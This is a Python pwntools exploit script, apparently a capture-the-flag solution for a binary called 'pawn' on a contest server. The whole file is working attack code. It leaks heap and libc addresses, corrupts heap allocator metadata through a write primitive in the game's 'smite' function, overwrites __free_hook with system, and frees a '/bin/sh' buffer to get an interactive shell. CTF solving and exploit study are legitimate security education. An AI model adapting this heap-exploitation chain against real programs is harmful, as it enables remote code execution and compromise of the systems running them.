#!/usr/bin/env python3
from pwn import *

def create(index):
    s.sendlineafter('Delete Board\n', '1')
    s.sendlineafter('index?\n', str(index))

def show(index):
    s.sendlineafter('Delete Board\n', '2')
    s.sendlineafter('index?\n', str(index))
    s.recvline()
    s.recvline()
    return [s.recvline(False)[2:] for _ in range(8)]

def move(index, ox, oy, nx, ny, wait=True):
    global t
    s.sendline('3')
    s.sendline(str(index))
    s.sendline(f'{ox} {oy}')
    s.sendline(f'{nx} {ny}')
    if wait:
        s.recvuntil('spaces.\n')
        s.recvuntil('spaces.\n')
    t = (t + 1) % 0x100

def smite(index, ox, oy):
    s.sendlineafter('Delete Board\n', '4')
    s.sendlineafter('index?\n', str(index))
    s.sendlineafter('spaces.\n', f'{ox} {oy}')
    return s.recvline(False) == b'Piece smotenified.'

def delete(index):
    s.sendlineafter('Delete Board\n', '5')
    s.sendlineafter('index?\n', str(index))

def set_t(value):
    p = log.progress(f'{t} -> {value}')
    diff = (value - t) % 0x100
    while t != value:
        p.status(str(t))
        move(4, 0, 1 - t % 2, 0, t % 2, False)
    for _ in range(diff * 2):
        s.recvuntil('spaces.\n')
    p.success()

def write(index, offset, value):
    set_t(value)
    return smite(index, offset - 9 * 2, 2)

elf = ELF('./pawn')
libc = ELF('./libc.so.6')

while True:
    if len(sys.argv) == 1:
        s = process('./pawn')
    else:
        s = remote('shell.actf.co', 21706)

    t = 0

    create(4)
    move(4, 0, 1, 0, 2)

    create(0)
    create(1)
    create(2)
    delete(2)
    delete(0)
    delete(1)
    heap_addr = u64(show(1)[0].ljust(8, b'\0'))
    log.info('heap address: %#x' % heap_addr)

    create(1)
    create(0)
    delete(0)
    for i in range(1, 5):
        if write(0, 8 + i, 1):
            write(0, 8 + i - 0x50, 1)
            break
    else:
        s.close()
        continue
    break
delete(0)
create(0)
for i, b in enumerate(p64(heap_addr + 0x130)):
    write(0, i, b)
for i, b in enumerate(p64(heap_addr + 0x600)):
    write(1, i + 0x40, b)
create(0)
create(2)
delete(1)
create(1)
for i, b in enumerate(p64(elf.got['puts'])):
    write(1, i + 0x40, b)
libc.address = u64(show(2)[0].ljust(8, b'\0')) - libc.symbols['puts']
log.info('libc base: %#x' % libc.address)

create(0)
create(1)
create(2)
delete(1)
delete(0)
for i in range(1, 5):
    if write(0, 8 + i, 1):
        write(0, 8 + i - 0x50, 1)
        break
delete(0)
create(0)
for i, b in enumerate(p64(heap_addr + 0x270)):
    write(0, i, b)
for i, b in enumerate(b'/bin/sh\0'):
    write(2, i, b)
create(3)
for i, b in enumerate(p64(libc.symbols['__free_hook'])):
    write(0, i + 0x40, b)
create(3)
for i, b in enumerate(p64(libc.symbols['system'])):
    write(3, i, b)
delete(2)

s.interactive()
